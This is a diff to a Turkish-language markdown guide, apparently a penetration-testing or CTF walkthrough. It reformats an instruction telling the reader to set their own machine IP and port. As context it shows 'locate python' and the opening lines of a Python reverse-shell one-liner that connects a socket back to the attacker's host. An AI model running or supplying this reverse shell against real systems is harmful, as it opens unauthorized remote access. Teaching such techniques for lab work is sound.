@@ -96,7 +96,9 @@ Makinede Python olup olmadığı kontrol edildikten sonra Python ile komut çal�
 
 ``` locate python ```
 <br>
-```Bu kodda Makine IP ve Port kısımlarını kendinize göre düzenlemelisiniz
+
+Bu kodda Makine IP ve Port kısımlarını kendinize göre düzenlemelisiniz.
+```
 python3 -c 'import socket,subprocess,os;
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
 s.connect(("Makine IP", PORT));
